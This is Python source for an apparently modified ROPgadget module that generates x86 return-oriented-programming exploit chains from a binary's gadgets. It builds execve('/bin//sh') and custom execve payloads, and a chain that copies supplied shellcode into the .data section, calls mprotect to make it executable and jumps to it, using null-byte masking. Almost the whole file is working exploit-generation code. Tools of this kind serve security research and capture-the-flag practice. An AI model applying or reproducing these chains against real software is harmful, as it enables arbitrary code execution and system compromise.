#!/usr/bin/env python3
## -*- coding: utf-8 -*-
##
##  Jonathan Salwan - 2014-05-13
##
##  http://shell-storm.org
##  http://twitter.com/JonathanSalwan
##

import re
from struct import pack
from ropgadget.ropchain.NullHandler import NullHandler as nh
from ropgadget.ropchain.MaskBuilder import MaskBuilder as mb
from collections import defaultdict

from datetime import datetime

class ROPMakerX86(object):
    def __init__(self, binary, gadgets, padding, execve, shellCode_filePath, liboffset=0x0):
        self.__binary  = binary
        self.__gadgets = gadgets #+ [{"vaddr" : 0xEEFFEEDD, "gadget" : "pop ebx ; ret"}, {"vaddr" : 0xAABBBBCC, "gadget" : "pop esi ; ret"}, {"vaddr" : 0xAACCDDCC, "gadget" : "sub ebx, esi ; ret"}]

        self.__FILE_NAME = "ropchain"
        
        # If it's a library, we have the option to add an offset to the addresses
        self.__liboffset = liboffset
        self.padding = padding

        self.__execve = execve          ### MODIFIED
        self.__WORD_SIZE = 4            ### MODIFIED
        self.__FILE_PATH_SHELLCODE = shellCode_filePath     ### MODIFIED

        self.possibledoubles = {}
        self.possiblemasks = {}
        self.possiblepops = {}
        self.possiblemovs = {}
        self.zeros = {}

        self.__generate()


    def __pops(self):

        outputdict = {}

        for reg in ["eax","ebx","ecx","edx","esi","edi"]:
            tmp = self.__lookingForSomeThing("pop %s" % reg)
            if tmp:
                outputdict[reg] = tmp

        return outputdict

    def __pushs(self):

        outputdict = defaultdict(lambda : None)

        for reg in ["eax","ebx","ecx","edx","esi","edi"]:
            tmp = self.__lookingForSomeThing("push %s" % reg)
            if tmp:
                outputdict[reg] = tmp

        return outputdict

    def __zeros(self):

        outputdict = defaultdict(lambda : None)

        for reg in ["eax","ebx","ecx","edx","esi","edi"]:
            tmp = self.__lookingForSomeThing("zero %s" % reg)
            if tmp:
                outputdict[reg] = tmp

        return outputdict
    

    def __lookingPossiableDoubles(self):

        outputdict = defaultdict(lambda : None)
        for gadget in self.__gadgets:

            f = gadget["gadget"].split(" ; ")[0]
            regex = re.search("add (?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3})), (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)

            if regex:
                lg = gadget["gadget"].split(" ; ")[1:]

                try:
                    if(regex.group("dst") != regex.group("src")):
                        raise

                    for g in lg:

                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    
                    outputdict[regex.group("src")] = [gadget,regex.group("src")]
                except:
                    continue

        return outputdict

    def __lookingPossiableMoves(self):

        outputdict = {}
        for gadget in self.__gadgets:

            f = gadget["gadget"].split(" ; ")[0]
            regex = re.search("mov (?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3})), (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)
            if regex:
                lg = gadget["gadget"].split(" ; ")[1:]

                try:
                    for g in lg:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    
                    if(regex.group("dst") == regex.group("src")):
                        raise

                    outputdict[(regex.group("dst"), regex.group("src"))] = gadget
                except:
                    continue

        return outputdict

    def GettingMaskChains(self, regdst, regsrc):

        possibledoubles = self.possibledoubles
        possiblemasks = self.possiblemasks
        possiblepops = self.possiblepops
        possiblemovs = self.possiblemovs
        possiblepushs = self.possiblepushs
        possiblezeros = self.zeros

        chainmasklist = []
        #bestmc= None its MF doom he the besGenerateMaskRopChaint mc


        for regsrc2 in ["eax","ebx","ecx","edx","esi","edi"]:
            double = possibledoubles[regdst] 

            if ((regdst,regsrc2) in possiblemasks and regsrc2 in possiblepops and regdst in possiblepops):
                for tuple in possiblemasks[(regdst,regsrc2)]:
                    mask,method,weight = tuple

                    mcoutputdict = {"maskchain":[possiblepops[regsrc2], possiblepops[regdst], mask],
                                    "masksrcanddst":[regsrc2,regdst],
                                    "method":method,
                                    "doublegadget":double,
                                    "weightofchain":weight,
                                    "pushdst" : possiblepushs[regdst]}

                    chainmasklist.append(mcoutputdict)

            for regdst2 in ["eax","ebx","ecx","edx","esi","edi"]:
                if ((regdst2,regsrc2) in possiblemasks and regsrc2 in possiblepops and regsrc2 in possiblepops):

                    double = possibledoubles[regdst2] 
                    if(regsrc != regsrc2 and regsrc != regdst2):
                        if((regdst,regdst2) in possiblemovs):
                            for tuple in possiblemasks[(regdst2,regsrc2)]:

                                mask,method,weight = tuple
                                mov = possiblemovs[(regdst,regdst2)]
                                mcoutputdict = {"maskchain":[possiblepops[regsrc2], possiblepops[regdst2], mask, mov],
                                                "masksrcanddst":[regsrc2,regdst2],
                                                "method":method,
                                                "doublegadget":double,
                                                "weightofchain":weight,
                                                "pushdst": possiblepushs[regdst2]}

                                chainmasklist.append(mcoutputdict)

        chainmasklist = sorted(chainmasklist, key=lambda x: x['weightofchain'])

        return chainmasklist 

    def __lookingPossiableMask(self):

        outputdict = {}
        weight = 0
        for mask in ["xor","add","sub"]: 
            for gadget in self.__gadgets:

                f = gadget["gadget"].split(" ; ")[0]
                regex = re.search(mask + " (?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3})), (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)|(0x+)]{3}))$", f)
                if regex:

                    lg = gadget["gadget"].split(" ; ")[1:]
                    

                    try:
                        for g in lg:
                            if g.split()[0] != "pop" and g.split()[0] != "ret":
                                raise
                            # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                            if g != "ret":
                                if g.split()[0] == "ret" and g.split()[1] != "":
                                    raise
                        
                        if(regex.group("dst") == regex.group("src")):
                            raise

                        if((regex.group("dst"), regex.group("src")) in outputdict):
                            outputdict[(regex.group("dst"), regex.group("src"))].append((gadget,mask,weight))
                        else:
                            outputdict[(regex.group("dst"), regex.group("src"))] = [(gadget,mask,weight)]
                    except:
                        continue

            weight = weight + 1

        for mask in ["inc","dec"]: 
            for reg in ["eax","ebx","ecx","edx","esi","edi"]:
                tmp = self.__lookingForSomeThing(mask + " %s" % reg)
                if tmp:
                    if (reg, reg) in outputdict:
                        outputdict[(reg, reg)].append((tmp,mask,weight))
                    else:
                        outputdict[(reg, reg)] = [(tmp,mask,weight)]

            weight = weight + 1

        return outputdict

    def __lookingForWrite4Where(self, gadgetsAlreadyTested):

        for gadget in self.__gadgets:
            if gadget in gadgetsAlreadyTested:
                continue
            f = gadget["gadget"].split(" ; ")[0]
            # regex -> mov dword ptr [r32], r32
            regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)
            if regex:
                lg = gadget["gadget"].split(" ; ")[1:]
                try:
                    for g in lg:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise

                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return [gadget,regex.group("dst"), regex.group("src")]
                except:
                    continue
        return None
    
    def __lookingForDst4Write(self, gadgetsAlreadyTested, dst):

        for gadget in self.__gadgets:
            if gadget in gadgetsAlreadyTested:
                continue
            f = gadget["gadget"].split(" ; ")[0]
            # regex -> mov dword ptr [r32], r32
            regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([" + dst + "]{3}))$", f)
            if regex:
                lg = gadget["gadget"].split(" ; ")[1:]
                try:
                    for g in lg:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise

                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return [gadget,regex.group("dst"), regex.group("src")]
                except:
                    continue
        return None

    def __lookingForSomeThing(self, something):
        for gadget in self.__gadgets:
            lg = gadget["gadget"].split(" ; ")
            if lg[0] == something:
                try:
                    for g in lg[1:]:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return gadget
                except:
                    continue
        return None

    def __padding(self, gadget, regAlreadSetted):
        lg = gadget["gadget"].split(" ; ")
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    print("\tp += pack('<I', 0x%08x) # padding without overwrite %s" % (regAlreadSetted[reg], reg))
                except KeyError:
                    print("\tp += pack('<I', 0x41414141) # padding")

    def __custompadding(self, gadget, regAlreadSetted):
        lg = gadget["gadget"].split(" ; ")
        p = b''
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    p += pack('<I', regAlreadSetted[reg])
                except KeyError:
                    p += pack('<I', 0x41414141)
        return p 

    def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):

        sects = self.__binary.getDataSections()
        dataAddr = None
        for s in sects:
            if s["name"] == ".data":
                dataAddr = s["vaddr"] + self.__liboffset
        if dataAddr is None:
            print("\n[-] Error - Can't find a writable section")
            return

        print("#!/usr/bin/env python3")
        print("# execve generated by ROPgadget\n")
        print("from struct import pack\n")

        print("# Padding goes here")
        print("p = b''\n")

        print("p += pack('<I', 0x%08x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data" % dataAddr)
        self.__padding(popDst, {})

        print("p += pack('<I', 0x%08x) # %s" % (popSrc["vaddr"], popSrc["gadget"]))
        print("p += b'/bin'")
        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst

        print("p += pack('<I', 0x%08x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("p += pack('<I', 0x%08x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data + 4" % (dataAddr + 4))
        self.__padding(popDst, {})

        print("p += pack('<I', 0x%08x) # %s" % (popSrc["vaddr"], popSrc["gadget"]))
        print("p += b'//sh'")
        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 4})  # Don't overwrite reg dst
        print("p += pack('<I', 0x%08x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("p += pack('<I', 0x%08x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popDst, {})

        print("p += pack('<I', 0x%08x) # %s" % (xorSrc["vaddr"], xorSrc["gadget"]))
        self.__padding(xorSrc, {})

        print("p += pack('<I', 0x%08x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("p += pack('<I', 0x%08x) # %s" % (popEbx["vaddr"], popEbx["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data" % dataAddr)
        self.__padding(popEbx, {})

        print("p += pack('<I', 0x%08x) # %s" % (popEcx["vaddr"], popEcx["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popEcx, {"ebx": dataAddr})  # Don't overwrite ebx

        print("p += pack('<I', 0x%08x) # %s" % (popEdx["vaddr"], popEdx["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        print("p += pack('<I', 0x%08x) # %s" % (xorEax["vaddr"], xorEax["gadget"]))
        self.__padding(xorEax, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx
        
        for _ in range(11):
            print("p += pack('<I', 0x%08x) # %s" % (incEax["vaddr"], incEax["gadget"]))
            self.__padding(incEax, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        print("p += pack('<I', 0x%08x) # %s" % (syscall["vaddr"], syscall["gadget"]))




    def customRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):

        sects = self.__binary.getDataSections()
        dataAddr = None
        for s in sects:
            if s["name"] == ".data":
                dataAddr = s["vaddr"] + self.__liboffset
        if dataAddr is None:
            print("\n[-] Error - Can't find a writable section")
            return

        # Add padding
        p = b'A' * self.padding        
       
        print("{0} - argv = {1}".format(datetime.now().strftime("%H:%M:%S"), self.__execve))

        stack = dataAddr
        #-----------------------------stack--------------------------
        print("{0} - Writing arguments to the .data section...".format(datetime.now().strftime("%H:%M:%S")))

        for i in range(len(self.__execve)):
            arg = self.__execve[i]
            chunk = len(arg) // 4        
            for j in range(chunk): 
                
                p += pack('<I', popDst["vaddr"]) 
                p += pack('<I', stack) 
                p += self.__custompadding(popDst, {})

                p += pack('<I', popSrc["vaddr"]) 
                p += arg[j*4:j*4+4] 
                p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst

                p += pack('<I', write4where["vaddr"]) 
                p += self.__custompadding(write4where, {}) 
                
                stack = stack + 4

                #arg each in 4 chunk

            lastWord = arg[len(arg)-4: len(arg)]                          # The last 4 bytes of the current argument
            locationForNULL = stack                                             # We place the null right at the top of the stack

            if (b'\x07' in lastWord):
                locationForNULL = stack - (4 - lastWord.index(b'\x07'))         # Write a NULL at the end of the argument

            p += pack('<I', popDst["vaddr"]) 
            p += pack('<I', locationForNULL)
            p += self.__custompadding(popDst, {})

            p += pack('<I', xorSrc["vaddr"]) 
            p += self.__custompadding(xorSrc, {})

            p += pack('<I', write4where["vaddr"]) 
            p += self.__custompadding(write4where, {})
            stack = stack + 1

            #adding null

        argindex = 0
        safestack = stack

        #----------------------------------args/__execve---------------------------------
        print("{0} - Pushing pointers to arguments into .data section...".format(datetime.now().strftime("%H:%M:%S")))

        for arg in self.__execve:

            p += pack('<I', popDst["vaddr"]) 
            p += pack('<I', stack) 
            p += self.__custompadding(popDst, {})

            p += pack('<I', popSrc["vaddr"]) 
            p += pack('<I', dataAddr + argindex) 
            p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst

            p += pack('<I', write4where["vaddr"]) 
            p += self.__custompadding(write4where, {})        

            stack = stack + 4
            argindex = argindex + len(arg) + 1 

            #writes arg on shadowstack
        
        p += pack('<I', popDst["vaddr"]) 
        p += pack('<I', stack) 
        p += self.__custompadding(popDst, {})

        p += pack('<I', xorSrc["vaddr"]) 
        p += self.__custompadding(xorSrc, {})

        p += pack('<I', write4where["vaddr"]) 
        p += self.__custompadding(write4where, {})

        #adding null

        p += pack('<I', popEbx["vaddr"]) 
        p += pack('<I', dataAddr) 
        p += self.__custompadding(popEbx, {})

        #puts stack in to ebx (program)

        p += pack('<I', popEcx["vaddr"]) 
        p += pack('<I', safestack) 
        p += self.__custompadding(popEcx, {"ebx": dataAddr})  

        #puts stack + 60 in to ecx (args)

        p += pack('<I', popEdx["vaddr"]) 
        p += pack('<I', stack) 
        p += self.__custompadding(popEdx, {"ebx": dataAddr, "ecx": safestack})  

        #puts stack in to edx (env)

        p += pack('<I', xorEax["vaddr"]) 
        p += self.__custompadding(xorEax, {"ebx": dataAddr, "ecx": safestack})  

        for _ in range(11):
            p += pack('<I', incEax["vaddr"]) 
            p += self.__custompadding(incEax, {"ebx": dataAddr, "ecx": safestack})  # Don't overwrite ebx and ecx

        #sets eax to 11

        print("{0} - Running execve()...".format(datetime.now().strftime("%H:%M:%S")))

        p += pack('<I', syscall["vaddr"]) 

        #runs systemcall

        outputfile = open(self.__FILE_NAME, "wb")
        outputfile.write(p)
        outputfile.close()


    def arbitrary_shell_code(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, maskEbx, popEcx, maskEcx, popEdx, maskEdx, syscall, chainmask):

        sects = self.__binary.getDataSections()
        dataAddr = None
        bss = None
        for s in sects:
            if s["name"] == ".data":
                dataAddr = s["vaddr"] + self.__liboffset
            if s["name"] == ".bss":
                bss = s["vaddr"] + self.__liboffset
        if dataAddr is None:
            print("\n[-] Error - Can't find a writable section")
            return
        if bss is None:
            print("\n[-] Error - Can't find a bss")
            return

        p = b'\x41' * self.padding


        # EXAMPLE CODE
        # 
        # 31 c0 50 68
        # 2f 2f 73 68
        # 68 2f 62 69
        # 6e 89 e3 50
        # 53 89 e1 99
        # b0 0b cd 80
        
        # load in shellcode
        file = open(self.__FILE_PATH_SHELLCODE, "rb")
        shellCode = file.read()
        file.close()

        # Find page
        start_of_page = (dataAddr & 0xFFFFF000)
        topOfData = dataAddr

        len_shellCode = topOfData - start_of_page + len(shellCode)

        # Load shellcode into .data (this might not work as .data normally cant be executable)
        for i in range(0, int(len(shellCode)/self.__WORD_SIZE) ):

            p += pack('<I', popDst["vaddr"]) 
            p += pack('<I', topOfData) 
            p += self.__custompadding(popDst, {})

            p += pack('<I', popSrc["vaddr"]) 
            p += shellCode[i*4:(i+1)*4] 
            p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: topOfData})  # Don't overwrite reg dst

            p += pack('<I', write4where["vaddr"]) 
            p += self.__custompadding(write4where, {}) 

            topOfData += self.__WORD_SIZE

        # Setup mprotect()

        # ECX = length of shellcode
        p += self.GenerateMaskRopChain(len_shellCode, maskEcx, {})

        # EBX = loc_shellCode
        p += self.GenerateMaskRopChain(start_of_page, maskEbx, {"ecx" : len_shellCode})

        # EDX = 4
        p += self.GenerateMaskRopChain(0x00000007, maskEdx, {"ebx" : start_of_page, "ecx" : len_shellCode})

        # EAX = 125
        p += pack("<I", xorEax["vaddr"])
        p += self.__custompadding(xorEax, {"ebx" : start_of_page, "ecx" : len_shellCode,"edx" : 0x00000007})

        for i in range(125):
            p += pack("<I", incEax["vaddr"])
            p += self.__custompadding(incEax, {"ebx" : start_of_page, "ecx" : len_shellCode, "edx" : 0x00000007})

        # Run syscall
        p += pack('<I', syscall["vaddr"]) 
        p += self.__custompadding(syscall, {})

        # jump to the shellcode
        p += pack('<I', dataAddr) 
        

        file = open(self.__FILE_NAME, "wb")
        file.write(p)
        file.close()

        print("{0} - Arbitrary shell code ROPchain written to {1}".format(datetime.now().strftime("%H:%M:%S"), self.__FILE_NAME))

    def testingmasking(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, maskEbx, popEcx, maskEcx, popEdx, MaskEdx, syscall, chainmask):
     
        p = b'\x41' * self.padding
        p += self.GenerateMaskRopChain(4096, maskEcx, {})

        print("ROPCHAIN is:", p)
        file = open("test_ROP", "wb")
        file.write(p)
        file.close()

     # Apply mask rop chain
    
    def GenerateMaskRopChain(self, value, listchainmask, otherregs , gadget_address=False):
        
        # If the value doesn't contain any NULLs then we can just return
        if (not (nh(self.__WORD_SIZE).contains_null(value.to_bytes(self.__WORD_SIZE, "big"))) ):
            
            # pop to dst
            alt_p  = pack("<I", listchainmask[0]["maskchain"][1]["vaddr"])
            alt_p += pack("<I", value)

            alt_p += self.__custompadding(listchainmask[0]["maskchain"][1], otherregs)
            
            #alt_p += pack()

            return alt_p#pack("<I", value)

        #p = b'A'*44
        minsizeofp = 0
        minp = b''
        printminp = []

        print("{0} - Finding the most efficient masks for the value: 0x{1:08X}. This might take a while depending on what masks are avaliable...".format(datetime.now().strftime("%H:%M:%S"), value))

        for chainmask in listchainmask:

            printp = []
            p = b''

            #print("Possible chain mask: {0}\n\n".format(chainmask))
        
            if (chainmask["method"] == "dec" or chainmask["method"] == "inc"):

                # Use DEC as the (un)masker
               
                mask, masked_value = nh(self.__WORD_SIZE).CreateIterativeMask(value.to_bytes(4, byteorder="big"), chainmask["method"]) 

                # Create mask for double with inc gadget
                if (chainmask["method"] == "inc" and (not (chainmask["doublegadget"] is None))):
                    masked_value = 0xFFFFFFFF            

                #print("Mask:", mask, "Masked_value:", masked_value)

                printp.append(pack("<I", masked_value))
                popsomereg = chainmask["maskchain"][0]
                printp.append(popsomereg)

                p += pack("<I", popsomereg["vaddr"])
                p += pack("<I", masked_value)
                p += self.__custompadding(popsomereg, otherregs)

                #print(p)
                
                # mask is always on the third in maskchain
                maskgadget = chainmask["maskchain"][2]
                otherregs[popsomereg["gadget"].split()[1]] = masked_value 
                doublegadget = chainmask["doublegadget"]


                # Do we have a doublegadget
                doubleinc = None 
                if(chainmask["method"] == "inc" and chainmask["doublegadget"]):
                    doubleinc = chainmask["doublegadget"]

                    op_chain = nh(self.__WORD_SIZE).CreateDoubleWithIncMaskOperationChain(value)

                    # Set our masked_value to 0 from 0xFFFFFFFF
                    p += pack("<I", maskgadget["vaddr"])
                    p += self.__custompadding(maskgadget, otherregs)

                    for op in op_chain:
                        if   (op == "inc"):
                            # Add increment to the chain
                            p += pack("<I", maskgadget["vaddr"])
                            p += self.__custompadding(maskgadget, otherregs)
                        
                        elif (op == "double"):
                            # Add the double gadget
                            p += pack("<I", doublegadget[0]["vaddr"])
                            p += self.__custompadding(doublegadget[0], otherregs)

                        else:
                            raise Exception("How the hell did you get here?")

                # If there is no double then we can just use dec/inc
                elif(mask < 500):
                    for i in range(mask):

                        printp.append(maskgadget)
                        p += pack("<I", maskgadget["vaddr"])
                        p += self.__custompadding(maskgadget, otherregs)
                else:
                    
                    continue

                #too handle if there a mov at the end 
                if(len(chainmask["maskchain"]) == 4):
                    movgadget = chainmask["maskchain"][3]
                    printp.append(movgadget)
                    p += pack("<I", movgadget["vaddr"])
                    p += self.__custompadding(movgadget, otherregs)
                
            # Case of non-iterative arithmetic masks
            elif (chainmask["method"] == "add" or chainmask["method"] == "sub" or chainmask["method"] == "xor"):
                
                #print("mask : %s" %chainmask["method"])
                tmp = nh(self.__WORD_SIZE).CreateNonIterativeMask(value.to_bytes(4, byteorder="big"), chainmask["method"])
                if (tmp is None):
                    continue

                mask, masked_value = tmp
                #print(str(pack("<I", masked_value)))
                #print(str(pack("<I", mask)))

                printp.append(pack("<I", masked_value))
                popsomereg = chainmask["maskchain"][1]
                printp.append(popsomereg)

                #p = self.NonIterativeMask(mask, masked_addr, chainmask)

                p += pack("<I", chainmask["maskchain"][0]["vaddr"])
                p += pack("<I", mask)
                p += self.__custompadding(chainmask["maskchain"][0], otherregs)

                p += pack("<I", chainmask["maskchain"][1]["vaddr"])
                p += pack("<I", masked_value)
                tmp = otherregs
                tmp[chainmask["maskchain"][1]["gadget"].split()[1]] = mask
                p += self.__custompadding(chainmask["maskchain"][1], tmp)

                # mask is always in the third position
                p += pack("<I", chainmask["maskchain"][2]["vaddr"])
                p += self.__custompadding(chainmask["maskchain"][2], otherregs)

                # In the case there is a mov at the end 
                if(len(chainmask["maskchain"]) == 4):
                    movgadget = chainmask["maskchain"][3]

                    p += pack("<I", movgadget["vaddr"])
                    p += self.__custompadding(movgadget, otherregs)

            else:
                print("NOTHING")


            ##### post processing in case of address with NULL bytes #####

            # If the value that has been passed through is an address then we need to push it onto the stack so it can the be run
            if (gadget_address):
                if("pushdst" in chainmask):
                    p += pack("<I", chainmask["pushdst"]["vaddr"])
                    p += self.__custompadding(chainmask["pushdst"], otherregs)
                else:
                    print("does not have push for %s",chainmask["masksrcanddst"][0])
                    exit()


            if(minp == b'' or (len(p) < minsizeofp and p != b'')):
                minp = p
                minsizeofp = len(p)
                printminp = printp 


        #for printvalue in printminp:
        #    print(printvalue)

        print("{0} - Arbitrary execve() ROPchain written to {1}".format(datetime.now().strftime("%H:%M:%S"), self.__FILE_NAME))
        return minp


    # Used to create a ROPchain for non iteratie masks (i.e. inc and dec). These chains are the most efficient
    # Based off the old function CM
    

    def __generate(self):

        # To find the smaller gadget
        self.__gadgets.reverse()

        print("\nROP chain generation\n===========================================================")

        print("\n- Step 1 -- Write-what-where gadgets\n")

        gadgetsAlreadyTested = []
        self.possiblemasks = self.__lookingPossiableMask()
        self.possibledoubles = self.__lookingPossiableDoubles()
        self.possiblemovs= self.__lookingPossiableMoves()
        self.possiblepops = self.__pops()
        self.possiblepushs = self.__pushs()
        self.zeros = self.__zeros()

        storedgadgets = [] 
        storedgadgetsAlreadyTested= [] 

        while True:
            write4where = self.__lookingForWrite4Where(gadgetsAlreadyTested)
            if not write4where:
                if(len(storedgadgets) == 0):
                    print("\t[-] Can't find the 'mov dword ptr [r32], r32' gadget")
                    return
                write4where = storedgadgets[0]
                popDst = storedgadgets[1]
                popSrc = storedgadgets[2]
                xorSrc = storedgadgets[3]
                listchainmask = storedgadgets[4]
                storedgadgets = storedgadgetsAlreadyTested
                break

            popDst = self.__lookingForSomeThing("pop %s" % write4where[1])
            if not popDst:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % write4where[1])
                gadgetsAlreadyTested += [write4where[0]]
                continue

            popSrc = self.__lookingForSomeThing("pop %s" % write4where[2])
            if not popSrc:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % write4where[2])
                gadgetsAlreadyTested += [write4where[0]]
                continue

            xorSrc = self.__lookingForSomeThing("xor %s, %s" % (write4where[2], write4where[2]))
            if not xorSrc:
                print("\t[-] Can't find the 'xor %s, %s' gadget. Try with another 'mov [r], r'\n" % (write4where[2], write4where[2]))
                gadgetsAlreadyTested += [write4where[0]]
                continue

            #getting second source
            #chainmask = self.__lookingForMasks(write4where[1], write4where[2], possiablemasks, possiablemovs, possiablepops,possiabledoubles)
            # I not sure about writing to src karl, not sure about it one bit
            listchainmask = self.GettingMaskChains(write4where[2], write4where[2])
            
            if(not listchainmask):
                print("\t[-] Can't find the 'mask chain' gadget. Try with another 'mov [r], r'\n")
                gadgetsAlreadyTested += [write4where[0]]
                continue

            if(len(storedgadgets) != 0):


                if(storedgadgets[4][0]["weightofchain"] == 0):

                    print("\t[-] found a worst vaild comb'\n")
                    gadgetsAlreadyTested += [write4where[0]]
                    continue

                if(listchainmask[0]["weightofchain"] == 0):

                    storedgadgets = [write4where,popDst,popSrc,xorSrc,listchainmask]
                    storedgadgetsAlreadyTested = gadgetsAlreadyTested

                    gadgetsAlreadyTested += [write4where[0]]

                    print("\t[-] found a vaild comb'\n")
                    continue

                for chainmask in storedgadgets[4]:

                    if(chainmask["doublegadget"]):
                        print("\t[-] found a worst vaild comb'\n")
                        gadgetsAlreadyTested += [write4where[0]]
                        continue

                for chainmask in listchainmask:       
                
                    if(chainmask["doublegadget"]):
                        print("\t[-] found a worst vaild comb'\n")
                        gadgetsAlreadyTested += [write4where[0]]
                        continue

                if(listchainmask[0]["weightofchain"] > storedgadgets[4][0]["weightofchain"]):
                    print("\t[-] found a worst vaild comb'\n")
                    gadgetsAlreadyTested += [write4where[0]]
                    continue

                else:
                    storedgadgets = [write4where,popDst,popSrc,xorSrc,listchainmask]
                    storedgadgetsAlreadyTested = gadgetsAlreadyTested

                    gadgetsAlreadyTested += [write4where[0]]

                    print("\t[-] found a vaild comb'\n")
                    continue
                
            else:
                storedgadgets = [write4where,popDst,popSrc,xorSrc,listchainmask]
                storedgadgetsAlreadyTested = gadgetsAlreadyTested

                gadgetsAlreadyTested += [write4where[0]]

                print("\t[-] found a vaild comb'\n")
                continue
 
        
        print("\n- Step 2 -- Init syscall number gadgets\n")

        xorEax = self.__lookingForSomeThing("xor eax, eax")
        if not xorEax:
            print("\t[-] Can't find the 'xor eax, eax' instruction")
            return

        incEax = self.__lookingForSomeThing("inc eax")
        if not incEax:
            print("\t[-] Can't find the 'inc eax' instruction")
            return

        print("\n- Step 3 -- Init syscall arguments gadgets\n")

        popEbx = self.__lookingForSomeThing("pop ebx")
        MaskEbx =  self.GettingMaskChains("ebx","ebx")
        
        #used for shellcoded
        if not MaskEbx:
            print("\t[-] Can't find the 'ebx mask' instruction")
            return

        if not popEbx:
            print("\t[-] Can't find the 'pop ebx' instruction")
            return

        popEcx = self.__lookingForSomeThing("pop ecx")
        MaskEcx =  self.GettingMaskChains("ecx","ecx")

        #used for shellcoded
        if not MaskEcx:
            print("\t[-] Can't find the 'ebx mask' instruction")
            return

        if not popEcx:
            print("\t[-] Can't find the 'pop ecx' instruction")
            return

        popEdx = self.__lookingForSomeThing("pop edx")
        MaskEdx =  self.GettingMaskChains("edx","edx")
        
        #used for shellcoded
        if not MaskEdx:
            print("\t[-] Can't find the 'edx mask' instruction")
            return

        if not popEdx:
            print("\t[-] Can't find the 'pop edx' instruction")
            return

        print("\n- Step 4 -- Syscall gadget\n")

        syscall = self.__lookingForSomeThing("int 0x80")
        if not syscall:
            print("\t[-] Can't find the 'syscall' instruction")
            return

        print("\n- Step 5 -- Build the ROP chain\n")


        # Selects if we are generating a ropchain for shellcode or for an arb execve()
        if (self.__FILE_PATH_SHELLCODE):
            self.arbitrary_shell_code(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, MaskEbx, popEcx, MaskEcx, popEdx, MaskEdx, syscall, listchainmask)
        else:
            self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
        